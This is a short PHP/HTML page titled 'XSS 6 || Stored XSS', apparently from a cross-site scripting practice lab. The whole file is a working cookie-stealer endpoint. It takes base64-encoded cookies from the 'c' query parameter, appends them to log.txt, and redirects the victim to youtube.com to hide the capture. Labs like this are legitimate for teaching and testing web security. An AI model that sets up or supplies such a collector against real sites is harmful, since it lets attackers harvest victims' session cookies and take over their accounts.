<!DOCTYPE html>
<html>

<head>
    <title>XSS 6 || Stored XSS</title>
    <link rel="shortcut icon" href="../Resources/hmbct.png" />
    <link rel="stylesheet" href="../Resources/button.css">
</head>

<body style="background: #2F3FB0; color: white;">

    <?php
    header('Location:https://youtube.com');

    if (isset($_GET["c"])) {
        $cookies = base64_decode(urldecode($_GET["c"]));
		$file = fopen('log.txt', 'a');
		fwrite($file, $cookies . "\n\n");
    }
    ?>

</body>

</html>